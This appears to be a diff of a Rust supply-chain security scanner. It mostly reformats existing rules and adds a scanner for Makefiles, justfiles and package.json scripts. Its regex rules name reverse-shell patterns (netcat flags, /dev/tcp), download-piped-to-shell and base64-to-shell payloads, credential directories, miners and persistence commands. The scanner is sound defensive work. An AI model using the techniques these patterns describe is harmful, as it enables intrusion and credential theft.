@@ -77,40 +77,119 @@ struct PatternRule {
 fn build_content_rules() -> Vec<PatternRule> {
     let rules = vec![
         // Shell / command execution
-        (r"(?i)(curl|wget|invoke-webrequest|iwr|irm)\s+.*(http|ftp)", Severity::Critical, "Network download command detected"),
-        (r"(?i)(powershell|pwsh|cmd|bash|sh|zsh)\s+(-c|-Command|-enc|-EncodedCommand)", Severity::Critical, "Shell execution with inline command"),
+        (
+            r"(?i)(curl|wget|invoke-webrequest|iwr|irm)\s+.*(http|ftp)",
+            Severity::Critical,
+            "Network download command detected",
+        ),
+        (
+            r"(?i)(powershell|pwsh|cmd|bash|sh|zsh)\s+(-c|-Command|-enc|-EncodedCommand)",
+            Severity::Critical,
+            "Shell execution with inline command",
+        ),
         (r"(?i)\beval\b\s*\(", Severity::High, "eval() call detected"),
-        (r"(?i)(nc|ncat|netcat)\s+.*-[elp]", Severity::Critical, "Netcat with listen/exec flags (possible reverse shell)"),
-        (r"(?i)/dev/tcp/", Severity::Critical, "Bash /dev/tcp redirection (reverse shell pattern)"),
-        (r"(?i)\bsystem\s*\(", Severity::High, "system() call detected"),
+        (
+            r"(?i)(nc|ncat|netcat)\s+.*-[elp]",
+            Severity::Critical,
+            "Netcat with listen/exec flags (possible reverse shell)",
+        ),
+        (
+            r"(?i)/dev/tcp/",
+            Severity::Critical,
+            "Bash /dev/tcp redirection (reverse shell pattern)",
+        ),
+        (
+            r"(?i)\bsystem\s*\(",
+            Severity::High,
+            "system() call detected",
+        ),
         (r"(?i)exec\s*\(", Severity::High, "exec() call detected"),
-
         // Obfuscation / encoding
-        (r"(?i)base64\s*(-d|--decode|_decode|\.decode)", Severity::High, "Base64 decode operation"),
-        (r"[A-Za-z0-9+/]{60,}={0,2}", Severity::Medium, "Long base64-like string"),
-        (r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}", Severity::High, "Hex-encoded string sequence"),
-        (r"\\u[0-9a-fA-F]{4}(\\u[0-9a-fA-F]{4}){10,}", Severity::Medium, "Unicode-escaped string sequence"),
-        (r"String\.fromCharCode\s*\(", Severity::High, "String.fromCharCode (JS obfuscation)"),
-        (r"(?i)atob\s*\(", Severity::High, "atob() base64 decode in JS"),
-        (r#"\$\{.*\$\(.*\).*\}"#, Severity::Medium, "Nested command substitution in variable"),
-
+        (
+            r"(?i)base64\s*(-d|--decode|_decode|\.decode)",
+            Severity::High,
+            "Base64 decode operation",
+        ),
+        (
+            r"[A-Za-z0-9+/]{60,}={0,2}",
+            Severity::Medium,
+            "Long base64-like string",
+        ),
+        (
+            r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}",
+            Severity::High,
+            "Hex-encoded string sequence",
+        ),
+        (
+            r"\\u[0-9a-fA-F]{4}(\\u[0-9a-fA-F]{4}){10,}",
+            Severity::Medium,
+            "Unicode-escaped string sequence",
+        ),
+        (
+            r"String\.fromCharCode\s*\(",
+            Severity::High,
+            "String.fromCharCode (JS obfuscation)",
+        ),
+        (
+            r"(?i)atob\s*\(",
+            Severity::High,
+            "atob() base64 decode in JS",
+        ),
+        (
+            r#"\$\{.*\$\(.*\).*\}"#,
+            Severity::Medium,
+            "Nested command substitution in variable",
+        ),
         // Credential / data theft
-        (r"(?i)(password|passwd|secret|token|api_key|apikey|credential)", Severity::Medium, "Reference to secrets/credentials"),
-        (r"(?i)\.(ssh|gnupg|aws|azure|gcloud|npmrc|pypirc)", Severity::High, "Reference to sensitive config directory/file"),
-        (r"(?i)(~|\\$HOME|%USERPROFILE%)/", Severity::Medium, "Home directory reference"),
-
+        (
+            r"(?i)(password|passwd|secret|token|api_key|apikey|credential)",
+            Severity::Medium,
+            "Reference to secrets/credentials",
+        ),
+        (
+            r"(?i)\.(ssh|gnupg|aws|azure|gcloud|npmrc|pypirc)",
+            Severity::High,
+            "Reference to sensitive config directory/file",
+        ),
+        (
+            r"(?i)(~|\\$HOME|%USERPROFILE%)/",
+            Severity::Medium,
+            "Home directory reference",
+        ),
         // Crypto mining
-        (r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining\.pool)", Severity::Critical, "Crypto mining indicator"),
-
+        (
+            r"(?i)(xmrig|stratum\+tcp|coinhive|cryptonight|monero|mining\.pool)",
+            Severity::Critical,
+            "Crypto mining indicator",
+        ),
         // Persistence / privilege escalation
-        (r"(?i)(crontab|schtasks|launchctl|systemctl\s+enable)", Severity::High, "Persistence mechanism command"),
-        (r"(?i)(chmod\s+[0-7]*[1-7][0-7]*\s+|chmod\s+\+[sx])", Severity::Medium, "Permission modification"),
+        (
+            r"(?i)(crontab|schtasks|launchctl|systemctl\s+enable)",
+            Severity::High,
+            "Persistence mechanism command",
+        ),
+        (
+            r"(?i)(chmod\s+[0-7]*[1-7][0-7]*\s+|chmod\s+\+[sx])",
+            Severity::Medium,
+            "Permission modification",
+        ),
         (r"(?i)sudo\s+", Severity::Medium, "Sudo usage"),
-
         // Suspicious file operations
-        (r"(?i)(rm\s+-rf|del\s+/[sfq]|rmdir\s+/s)", Severity::High, "Destructive file deletion"),
-        (r"(?i)>/dev/null\s+2>&1", Severity::Medium, "Output suppression (hiding traces)"),
-        (r"(?i)(mktemp|/tmp/|%TEMP%)", Severity::Low, "Temp directory usage"),
+        (
+            r"(?i)(rm\s+-rf|del\s+/[sfq]|rmdir\s+/s)",
+            Severity::High,
+            "Destructive file deletion",
+        ),
+        (
+            r"(?i)>/dev/null\s+2>&1",
+            Severity::Medium,
+            "Output suppression (hiding traces)",
+        ),
+        (
+            r"(?i)(mktemp|/tmp/|%TEMP%)",
+            Severity::Low,
+            "Temp directory usage",
+        ),
     ];
 
     rules
@@ -154,16 +233,12 @@ fn analyze_tasks_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
         }
 
         // Shell-type tasks with commands
-        if let Some(cmd) = task
-            .get("command")
-            .and_then(|c| c.as_str())
-            .or_else(|| {
-                task.get("args")
-                    .and_then(|a| a.as_array())
-                    .and_then(|a| a.first())
-                    .and_then(|v| v.as_str())
-            })
-        {
+        if let Some(cmd) = task.get("command").and_then(|c| c.as_str()).or_else(|| {
+            task.get("args")
+                .and_then(|a| a.as_array())
+                .and_then(|a| a.first())
+                .and_then(|v| v.as_str())
+        }) {
             let task_type = task
                 .get("type")
                 .and_then(|t| t.as_str())
@@ -172,10 +247,7 @@ fn analyze_tasks_json(path: &Path, content: &str, findings: &mut Vec<Finding>) {
                 findings.push(Finding::new(
                     Severity::High,
                     &file_str,
-                    &format!(
-                        "Shell/process task with command: {}",
-                        truncate(cmd, 120)
-                    ),
+                    &format!("Shell/process task with command: {}", truncate(cmd, 120)),
                 ));
             }
         }
@@ -186,17 +258,61 @@ fn analyze_settings_json(path: &Path, content: &str, findings: &mut Vec<Finding>
     let file_str = path.display().to_string();
 
     let dangerous_settings = [
-        ("terminal.integrated.defaultProfile", Severity::Medium, "Custom default terminal profile"),
-        ("terminal.integrated.shellArgs", Severity::High, "Custom terminal shell arguments"),
-        ("terminal.integrated.shell.", Severity::High, "Custom terminal shell path"),
-        ("terminal.integrated.env.", Severity::Medium, "Custom terminal environment variables"),
-        ("terminal.integrated.automationProfile", Severity::High, "Custom automation terminal profile"),
-        ("editor.formatOnSave", Severity::Low, "Format on save enabled (check formatter)"),
-        ("editor.defaultFormatter", Severity::Low, "Custom default formatter set"),
-        ("editor.codeActionsOnSave", Severity::Low, "Code actions on save"),
-        ("git.postCommitCommand", Severity::High, "Post-commit command configured"),
-        ("task.allowAutomaticTasks", Severity::Critical, "Automatic tasks explicitly allowed"),
-        ("security.workspace.trust.enabled", Severity::High, "Workspace trust setting modified"),
+        (
+            "terminal.integrated.defaultProfile",
+            Severity::Medium,
+            "Custom default terminal profile",
+        ),
+        (
+            "terminal.integrated.shellArgs",
+            Severity::High,
+            "Custom terminal shell arguments",
+        ),
+        (
+            "terminal.integrated.shell.",
+            Severity::High,
+            "Custom terminal shell path",
+        ),
+        (
+            "terminal.integrated.env.",
+            Severity::Medium,
+            "Custom terminal environment variables",
+        ),
+        (
+            "terminal.integrated.automationProfile",
+            Severity::High,
+            "Custom automation terminal profile",
+        ),
+        (
+            "editor.formatOnSave",
+            Severity::Low,
+            "Format on save enabled (check formatter)",
+        ),
+        (
+            "editor.defaultFormatter",
+            Severity::Low,
+            "Custom default formatter set",
+        ),
+        (
+            "editor.codeActionsOnSave",
+            Severity::Low,
+            "Code actions on save",
+        ),
+        (
+            "git.postCommitCommand",
+            Severity::High,
+            "Post-commit command configured",
+        ),
+        (
+            "task.allowAutomaticTasks",
+            Severity::Critical,
+            "Automatic tasks explicitly allowed",
+        ),
+        (
+            "security.workspace.trust.enabled",
+            Severity::High,
+            "Workspace trust setting modified",
+        ),
     ];
 
     let Ok(val) = serde_json::from_str::<serde_json::Value>(content) else {
@@ -233,7 +349,10 @@ fn analyze_launch_json(path: &Path, content: &str, findings: &mut Vec<Finding>) 
                 findings.push(Finding::new(
                     Severity::Medium,
                     &file_str,
-                    &format!("Debug config references task via {}: '{}'", field, task_name),
+                    &format!(
+                        "Debug config references task via {}: '{}'",
+                        field, task_name
+                    ),
                 ));
             }
         }
@@ -304,7 +423,12 @@ fn analyze_extensions_json(path: &Path, content: &str, findings: &mut Vec<Findin
     }
 }
 
-fn analyze_file_content(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
+fn analyze_file_content(
+    path: &Path,
+    content: &str,
+    rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
     let file_str = path.display().to_string();
     for (line_num, line) in content.lines().enumerate() {
         for rule in rules {
@@ -428,20 +552,33 @@ fn is_sample_hook(path: &Path) -> bool {
 }
 
 /// Scan a single hook file for suspicious content.
-fn analyze_hook_file(path: &Path, content: &str, rules: &[PatternRule], findings: &mut Vec<Finding>) {
+fn analyze_hook_file(
+    path: &Path,
+    content: &str,
+    rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
     let file_str = path.display().to_string();
     let name = path.file_name().unwrap_or_default().to_string_lossy();
 
     // Any non-sample hook is noteworthy; auto-triggered ones are higher severity
     let auto_triggered = [
-        "post-checkout", "post-merge", "post-commit", "pre-commit",
-        "pre-push", "prepare-commit-msg", "commit-msg",
+        "post-checkout",
+        "post-merge",
+        "post-commit",
+        "pre-commit",
+        "pre-push",
+        "prepare-commit-msg",
+        "commit-msg",
     ];
     if auto_triggered.iter().any(|h| name.as_ref() == *h) {
         findings.push(Finding::new(
             Severity::High,
             &file_str,
-            &format!("Active git hook '{}' runs automatically on common git operations", name),
+            &format!(
+                "Active git hook '{}' runs automatically on common git operations",
+                name
+            ),
         ));
     } else {
         findings.push(Finding::new(
@@ -493,7 +630,12 @@ fn analyze_git_config(git_dir: &Path, findings: &mut Vec<Finding>) {
 }
 
 /// Scan a shared hooks directory (e.g. `.githooks/`) in the repo root.
-fn scan_shared_hooks_dir(hooks_dir: &Path, rules: &[PatternRule], verbose: bool, findings: &mut Vec<Finding>) {
+fn scan_shared_hooks_dir(
+    hooks_dir: &Path,
+    rules: &[PatternRule],
+    verbose: bool,
+    findings: &mut Vec<Finding>,
+) {
     let dir_str = hooks_dir.display().to_string();
     findings.push(Finding::new(
         Severity::Medium,
@@ -647,30 +789,72 @@ fn scan_vscode_dir(vscode_dir: &Path, verbose: bool) -> Vec<Finding> {
 fn build_script_rules() -> Vec<PatternRule> {
     let rules = vec![
         // Network access from build scripts
-        (r"(?i)(reqwest|hyper|ureq|attohttpc|minreq|curl)::|\bsurf\b", Severity::Critical, "Network library usage in build script"),
-        (r"(?i)TcpStream|UdpSocket|TcpListener", Severity::Critical, "Raw network socket in build script"),
-
+        (
+            r"(?i)(reqwest|hyper|ureq|attohttpc|minreq|curl)::|\bsurf\b",
+            Severity::Critical,
+            "Network library usage in build script",
+        ),
+        (
+            r"(?i)TcpStream|UdpSocket|TcpListener",
+            Severity::Critical,
+            "Raw network socket in build script",
+        ),
         // Arbitrary command execution
-        (r"Command::new\s*\(", Severity::Medium, "Command execution in build script (review target)"),
-        (r#"Command::new\s*\(\s*"(curl|wget|bash|sh|powershell|cmd|python|node|ruby|perl)"#, Severity::Critical, "Build script spawns network/shell/scripting command"),
-
+        (
+            r"Command::new\s*\(",
+            Severity::Medium,
+            "Command execution in build script (review target)",
+        ),
+        (
+            r#"Command::new\s*\(\s*"(curl|wget|bash|sh|powershell|cmd|python|node|ruby|perl)"#,
+            Severity::Critical,
+            "Build script spawns network/shell/scripting command",
+        ),
         // File system access outside OUT_DIR
-        (r#"(?i)(home_dir|home_directory|dirs::home|env::var\(\s*"HOME")"#, Severity::High, "Build script accesses home directory"),
-        (r"(?i)\.(ssh|gnupg|aws|npmrc|gitconfig|cargo/credentials)", Severity::Critical, "Build script references sensitive config file"),
-        (r#"(?i)env::var\(\s*"(USER|USERNAME|LOGNAME|HOSTNAME|SSH_AUTH_SOCK)"\s*\)"#, Severity::Medium, "Build script reads identity/environment info"),
-
+        (
+            r#"(?i)(home_dir|home_directory|dirs::home|env::var\(\s*"HOME")"#,
+            Severity::High,
+            "Build script accesses home directory",
+        ),
+        (
+            r"(?i)\.(ssh|gnupg|aws|npmrc|gitconfig|cargo/credentials)",
+            Severity::Critical,
+            "Build script references sensitive config file",
+        ),
+        (
+            r#"(?i)env::var\(\s*"(USER|USERNAME|LOGNAME|HOSTNAME|SSH_AUTH_SOCK)"\s*\)"#,
+            Severity::Medium,
+            "Build script reads identity/environment info",
+        ),
         // Writing outside standard paths
-        (r#"(?i)write\(|write_all\(|create\("#, Severity::Low, "File write in build script (verify target path)"),
-        (r"(?i)set_permissions|chmod", Severity::High, "Build script modifies file permissions"),
-
+        (
+            r#"(?i)write\(|write_all\(|create\("#,
+            Severity::Low,
+            "File write in build script (verify target path)",
+        ),
+        (
+            r"(?i)set_permissions|chmod",
+            Severity::High,
+            "Build script modifies file permissions",
+        ),
         // Dynamic library loading
-        (r"(?i)(dlopen|LoadLibrary|libloading)", Severity::High, "Dynamic library loading in build script"),
-
+        (
+            r"(?i)(dlopen|LoadLibrary|libloading)",
+            Severity::High,
+            "Dynamic library loading in build script",
+        ),
         // Include arbitrary bytes
-        (r"include_bytes!\s*\(", Severity::Medium, "include_bytes! in build script (embeds binary data)"),
-
+        (
+            r"include_bytes!\s*\(",
+            Severity::Medium,
+            "include_bytes! in build script (embeds binary data)",
+        ),
         // Accessing cargo credentials / registry tokens
-        (r"(?i)(CARGO_REGISTRY_TOKEN|cargo.credentials|crates.io)", Severity::Critical, "Build script references cargo registry credentials"),
+        (
+            r"(?i)(CARGO_REGISTRY_TOKEN|cargo.credentials|crates.io)",
+            Severity::Critical,
+            "Build script references cargo registry credentials",
+        ),
     ];
 
     rules
@@ -713,8 +897,14 @@ fn collect_build_scripts(root: &Path) -> Result<Vec<BuildScriptInfo>, String> {
 
     if let Some(packages) = metadata.get("packages").and_then(|p| p.as_array()) {
         for pkg in packages {
-            let name = pkg.get("name").and_then(|n| n.as_str()).unwrap_or("unknown");
-            let version = pkg.get("version").and_then(|v| v.as_str()).unwrap_or("0.0.0");
+            let name = pkg
+                .get("name")
+                .and_then(|n| n.as_str())
+                .unwrap_or("unknown");
+            let version = pkg
+                .get("version")
+                .and_then(|v| v.as_str())
+                .unwrap_or("0.0.0");
             let manifest_path = pkg
                 .get("manifest_path")
                 .and_then(|m| m.as_str())
@@ -750,10 +940,14 @@ fn collect_build_scripts(root: &Path) -> Result<Vec<BuildScriptInfo>, String> {
                             let is_build = t
                                 .get("kind")
                                 .and_then(|k| k.as_array())
-                                .map(|kinds| kinds.iter().any(|k| k.as_str() == Some("custom-build")))
+                                .map(|kinds| {
+                                    kinds.iter().any(|k| k.as_str() == Some("custom-build"))
+                                })
                                 .unwrap_or(false);
                             if is_build {
-                                t.get("src_path").and_then(|s| s.as_str()).map(PathBuf::from)
+                                t.get("src_path")
+                                    .and_then(|s| s.as_str())
+                                    .map(PathBuf::from)
                             } else {
                                 None
                             }
@@ -848,7 +1042,10 @@ fn scan_cargo_build_scripts(root: &Path, verbose: bool) -> Vec<Finding> {
             info.package_version
         );
         if verbose {
-            println!("      {}", info.build_script_path.display().to_string().dimmed());
+            println!(
+                "      {}",
+                info.build_script_path.display().to_string().dimmed()
+            );
         }
     }
     println!();
@@ -905,18 +1102,81 @@ const NPM_LIFECYCLE_SCRIPTS: &[&str] = &[
 
 /// Well-known popular npm packages (used for typosquatting detection).
 const POPULAR_NPM_PACKAGES: &[&str] = &[
-    "express", "react", "react-dom", "lodash", "axios", "chalk", "commander",
-    "webpack", "babel", "eslint", "prettier", "typescript", "jest", "mocha",
-    "moment", "underscore", "request", "async", "debug", "bluebird",
-    "mongoose", "sequelize", "dotenv", "cors", "body-parser", "uuid",
-    "fs-extra", "glob", "minimist", "yargs", "inquirer", "socket.io",
-    "passport", "jsonwebtoken", "bcrypt", "nodemon", "pm2", "electron",
-    "next", "nuxt", "vue", "angular", "svelte", "tailwindcss", "postcss",
-    "rollup", "vite", "esbuild", "turbo", "nx", "lerna", "rimraf",
-    "mkdirp", "cross-env", "concurrently", "husky", "lint-staged",
-    "nodemailer", "puppeteer", "cheerio", "sharp", "jimp", "got",
-    "node-fetch", "superagent", "graphql", "apollo", "prisma", "knex",
-    "typeorm", "redis", "ioredis", "pg", "mysql2", "mongodb",
+    "express",
+    "react",
+    "react-dom",
+    "lodash",
+    "axios",
+    "chalk",
+    "commander",
+    "webpack",
+    "babel",
+    "eslint",
+    "prettier",
+    "typescript",
+    "jest",
+    "mocha",
+    "moment",
+    "underscore",
+    "request",
+    "async",
+    "debug",
+    "bluebird",
+    "mongoose",
+    "sequelize",
+    "dotenv",
+    "cors",
+    "body-parser",
+    "uuid",
+    "fs-extra",
+    "glob",
+    "minimist",
+    "yargs",
+    "inquirer",
+    "socket.io",
+    "passport",
+    "jsonwebtoken",
+    "bcrypt",
+    "nodemon",
+    "pm2",
+    "electron",
+    "next",
+    "nuxt",
+    "vue",
+    "angular",
+    "svelte",
+    "tailwindcss",
+    "postcss",
+    "rollup",
+    "vite",
+    "esbuild",
+    "turbo",
+    "nx",
+    "lerna",
+    "rimraf",
+    "mkdirp",
+    "cross-env",
+    "concurrently",
+    "husky",
+    "lint-staged",
+    "nodemailer",
+    "puppeteer",
+    "cheerio",
+    "sharp",
+    "jimp",
+    "got",
+    "node-fetch",
+    "superagent",
+    "graphql",
+    "apollo",
+    "prisma",
+    "knex",
+    "typeorm",
+    "redis",
+    "ioredis",
+    "pg",
+    "mysql2",
+    "mongodb",
 ];
 
 /// Simple edit distance (Levenshtein) for short strings.
@@ -926,8 +1186,12 @@ fn edit_distance(a: &str, b: &str) -> usize {
     let m = a_bytes.len();
     let n = b_bytes.len();
 
-    if m == 0 { return n; }
-    if n == 0 { return m; }
+    if m == 0 {
+        return n;
+    }
+    if n == 0 {
+        return m;
+    }
 
     let mut prev: Vec<usize> = (0..=n).collect();
     let mut curr = vec![0; n + 1];
@@ -935,10 +1199,12 @@ fn edit_distance(a: &str, b: &str) -> usize {
     for i in 1..=m {
         curr[0] = i;
         for j in 1..=n {
-            let cost = if a_bytes[i - 1] == b_bytes[j - 1] { 0 } else { 1 };
-            curr[j] = (prev[j] + 1)
-                .min(curr[j - 1] + 1)
-                .min(prev[j - 1] + cost);
+            let cost = if a_bytes[i - 1] == b_bytes[j - 1] {
+                0
+            } else {
+                1
+            };
+            curr[j] = (prev[j] + 1).min(curr[j - 1] + 1).min(prev[j - 1] + cost);
         }
         std::mem::swap(&mut prev, &mut curr);
     }
@@ -992,7 +1258,10 @@ fn analyze_npm_scripts(
 
     for &lifecycle in NPM_LIFECYCLE_SCRIPTS {
         if let Some(cmd) = scripts.get(lifecycle).and_then(|c| c.as_str()) {
-            let severity = if lifecycle == "preinstall" || lifecycle == "postinstall" || lifecycle == "install" {
+            let severity = if lifecycle == "preinstall"
+                || lifecycle == "postinstall"
+                || lifecycle == "install"
+            {
                 Severity::High
             } else {
                 Severity::Medium
@@ -1041,7 +1310,12 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
             analyze_npm_scripts(&pkg_json_path, &pkg, "root", &rules, &mut findings);
 
             // Check all dependency sections for typosquatting
-            for section in &["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"] {
+            for section in &[
+                "dependencies",
+                "devDependencies",
+                "optionalDependencies",
+                "peerDependencies",
+            ] {
                 if let Some(deps) = pkg.get(*section).and_then(|d| d.as_object()) {
                     for dep_name in deps.keys() {
                         if let Some(similar_to) = check_typosquatting(dep_name) {
@@ -1072,7 +1346,11 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
     let mut deps_with_scripts: Vec<(String, PathBuf)> = Vec::new();
 
     // Walk top-level and scoped packages in node_modules
-    let scan_pkg = |pkg_dir: &Path, findings: &mut Vec<Finding>, deps_with_scripts: &mut Vec<(String, PathBuf)>, rules: &[PatternRule], verbose: bool| {
+    let scan_pkg = |pkg_dir: &Path,
+                    findings: &mut Vec<Finding>,
+                    deps_with_scripts: &mut Vec<(String, PathBuf)>,
+                    rules: &[PatternRule],
+                    verbose: bool| {
         let dep_pkg_json = pkg_dir.join("package.json");
         if !dep_pkg_json.exists() {
             return;
@@ -1112,7 +1390,10 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
                 findings.push(Finding::new(
                     Severity::Low,
                     &dep_pkg_json.display().to_string(),
-                    &format!("dep:{}: has binding.gyp (native addon, compiles C/C++ on install)", pkg_name),
+                    &format!(
+                        "dep:{}: has binding.gyp (native addon, compiles C/C++ on install)",
+                        pkg_name
+                    ),
                 ));
             }
         }
@@ -1132,11 +1413,23 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
                 // Scoped package: @scope/name
                 if let Ok(scoped_entries) = fs::read_dir(&path) {
                     for scoped_entry in scoped_entries.filter_map(|e| e.ok()) {
-                        scan_pkg(&scoped_entry.path(), &mut findings, &mut deps_with_scripts, &rules, verbose);
+                        scan_pkg(
+                            &scoped_entry.path(),
+                            &mut findings,
+                            &mut deps_with_scripts,
+                            &rules,
+                            verbose,
+                        );
                     }
                 }
             } else {
-                scan_pkg(&path, &mut findings, &mut deps_with_scripts, &rules, verbose);
+                scan_pkg(
+                    &path,
+                    &mut findings,
+                    &mut deps_with_scripts,
+                    &rules,
+                    verbose,
+                );
             }
         }
     }
@@ -1160,46 +1453,330 @@ fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
     findings
 }
 
+// ---- Build orchestration analysis (Makefile / npm scripts / task files) ----
+
+/// Rules aimed at hidden or obfuscated command execution in build orchestration files.
+fn build_orchestration_rules() -> Vec<PatternRule> {
+    let rules = vec![
+        (
+            r"(?i)\$\((shell|eval)\s+.*\b(curl|wget|invoke-webrequest|iwr|irm)\b",
+            Severity::Critical,
+            "Hidden command expansion executes network downloader",
+        ),
+        (
+            r"(?i)\$\((shell|eval)\s+.*\b(cargo|go\s+build|rustc|gcc|clang|cmake|node-gyp)\b",
+            Severity::High,
+            "Hidden command expansion builds tooling/compiler output",
+        ),
+        (
+            r"(?i)`[^`]*(curl|wget|invoke-webrequest|iwr|irm|cargo|go\s+build|rustc|gcc|clang)[^`]*`",
+            Severity::High,
+            "Backtick command substitution runs downloader/build tool",
+        ),
+        (
+            r"(?i)(curl|wget|invoke-webrequest|iwr|irm)\s+[^|;\n]*https?://[^|;\n]*\|\s*(bash|sh|zsh|pwsh|powershell)\b",
+            Severity::Critical,
+            "Download piped directly into shell from build file",
+        ),
+        (
+            r"(?i)(echo|printf)\s+[A-Za-z0-9+/]{40,}={0,2}\s*\|\s*base64\s+(-d|--decode)[^|;\n]*\|\s*(bash|sh|zsh|pwsh|powershell)\b",
+            Severity::Critical,
+            "Base64-decoded payload piped to shell in build file",
+        ),
+    ];
+
+    rules
+        .into_iter()
+        .filter_map(|(pat, sev, desc)| {
+            Regex::new(pat).ok().map(|r| PatternRule {
+                pattern: r,
+                severity: sev,
+                description: desc,
+            })
+        })
+        .collect()
+}
+
+fn is_build_orchestration_file(path: &Path) -> bool {
+    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
+    let lower = name.to_ascii_lowercase();
+
+    if matches!(
+        lower.as_str(),
+        "makefile" | "gnumakefile" | "justfile" | "taskfile.yml" | "taskfile.yaml" | "package.json"
+    ) {
+        return true;
+    }
+    lower.ends_with(".mk")
+}
+
+fn should_skip_common_generated_dirs(path: &Path) -> bool {
+    let p = path.display().to_string();
+    p.contains("/node_modules/")
+        || p.contains("/.git/")
+        || p.contains("/target/")
+        || p.contains("/dist/")
+        || p.contains("/vendor/")
+}
+
+fn analyze_build_orchestration_text_file(
+    path: &Path,
+    content: &str,
+    orchestration_rules: &[PatternRule],
+    general_rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let file_str = path.display().to_string();
+
+    for (line_num, line) in content.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+
+        for rule in orchestration_rules {
+            if rule.pattern.is_match(trimmed) {
+                findings.push(
+                    Finding::new(rule.severity.clone(), &file_str, rule.description)
+                        .with_match(&truncate(trimmed, 140), line_num + 1),
+                );
+            }
+        }
+
+        for rule in general_rules {
+            if rule.pattern.is_match(trimmed) {
+                findings.push(
+                    Finding::new(rule.severity.clone(), &file_str, rule.description)
+                        .with_match(&truncate(trimmed, 140), line_num + 1),
+                );
+            }
+        }
+
+        if trimmed.len() > 500 {
+            findings.push(
+                Finding::new(
+                    Severity::High,
+                    &file_str,
+                    "Extremely long line in build orchestration file (possible obfuscation)",
+                )
+                .with_match(&truncate(trimmed, 140), line_num + 1),
+            );
+        }
+    }
+}
+
+fn analyze_package_json_all_scripts(
+    path: &Path,
+    content: &str,
+    orchestration_rules: &[PatternRule],
+    general_rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let file_str = path.display().to_string();
+    let Ok(pkg) = serde_json::from_str::<serde_json::Value>(content) else {
+        return;
+    };
+    let Some(scripts) = pkg.get("scripts").and_then(|s| s.as_object()) else {
+        return;
+    };
+
+    for (name, cmd_val) in scripts {
+        let Some(cmd) = cmd_val.as_str() else {
+            continue;
+        };
+        // Lifecycle scripts are already handled in dedicated npm lifecycle logic.
+        if NPM_LIFECYCLE_SCRIPTS.contains(&name.as_str()) {
+            continue;
+        }
+
+        for rule in orchestration_rules {
+            if rule.pattern.is_match(cmd) {
+                findings.push(Finding::new(
+                    rule.severity.clone(),
+                    &file_str,
+                    &format!(
+                        "npm script '{}': {}: {}",
+                        name,
+                        rule.description,
+                        truncate(cmd, 120),
+                    ),
+                ));
+            }
+        }
+        for rule in general_rules {
+            if rule.pattern.is_match(cmd) {
+                findings.push(Finding::new(
+                    rule.severity.clone(),
+                    &file_str,
+                    &format!(
+                        "npm script '{}': {}: {}",
+                        name,
+                        rule.description,
+                        truncate(cmd, 120),
+                    ),
+                ));
+            }
+        }
+    }
+}
+
+fn scan_build_orchestration_files(root: &Path, verbose: bool) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let orchestration_rules = build_orchestration_rules();
+    let general_rules = build_content_rules();
+
+    for entry in WalkDir::new(root)
+        .into_iter()
+        .filter_map(|e| e.ok())
+        .filter(|e| e.file_type().is_file())
+    {
+        let path = entry.path();
+        if should_skip_common_generated_dirs(path) || !is_build_orchestration_file(path) {
+            continue;
+        }
+
+        let Ok(content) = fs::read_to_string(path) else {
+            continue;
+        };
+        if verbose {
+            println!("  Analyzing {}", path.display());
+        }
+
+        if path.file_name().and_then(|n| n.to_str()) == Some("package.json") {
+            analyze_package_json_all_scripts(
+                path,
+                &content,
+                &orchestration_rules,
+                &general_rules,
+                &mut findings,
+            );
+        } else {
+            analyze_build_orchestration_text_file(
+                path,
+                &content,
+                &orchestration_rules,
+                &general_rules,
+                &mut findings,
+            );
+        }
+    }
+
+    findings
+}
+
 // ---- Dockerfile analysis ----
 
 /// Dockerfile instructions that are interesting from a security perspective.
 fn build_dockerfile_rules() -> Vec<PatternRule> {
     let rules = vec![
         // Network downloads in RUN
-        (r"(?i)RUN\s+.*\b(curl|wget|fetch|aria2c)\s+.*https?://", Severity::High, "Dockerfile RUN downloads from URL"),
-        (r"(?i)RUN\s+.*\|\s*(ba)?sh", Severity::Critical, "Dockerfile RUN pipes download into shell"),
-        (r"(?i)RUN\s+.*\bpip\s+install\s+--index-url\s+http", Severity::Critical, "Dockerfile RUN installs from non-HTTPS pip index"),
-        (r"(?i)RUN\s+.*\bnpm\s+install\s+--registry\s+http://", Severity::Critical, "Dockerfile RUN uses insecure npm registry"),
-
+        (
+            r"(?i)RUN\s+.*\b(curl|wget|fetch|aria2c)\s+.*https?://",
+            Severity::High,
+            "Dockerfile RUN downloads from URL",
+        ),
+        (
+            r"(?i)RUN\s+.*\|\s*(ba)?sh",
+            Severity::Critical,
+            "Dockerfile RUN pipes download into shell",
+        ),
+        (
+            r"(?i)RUN\s+.*\bpip\s+install\s+--index-url\s+http",
+            Severity::Critical,
+            "Dockerfile RUN installs from non-HTTPS pip index",
+        ),
+        (
+            r"(?i)RUN\s+.*\bnpm\s+install\s+--registry\s+http://",
+            Severity::Critical,
+            "Dockerfile RUN uses insecure npm registry",
+        ),
         // ADD from URL (ADD supports remote URLs, COPY does not)
-        (r"(?i)^ADD\s+https?://", Severity::High, "Dockerfile ADD from remote URL (prefer COPY + curl with checksum)"),
-
+        (
+            r"(?i)^ADD\s+https?://",
+            Severity::High,
+            "Dockerfile ADD from remote URL (prefer COPY + curl with checksum)",
+        ),
         // Suspicious RUN commands
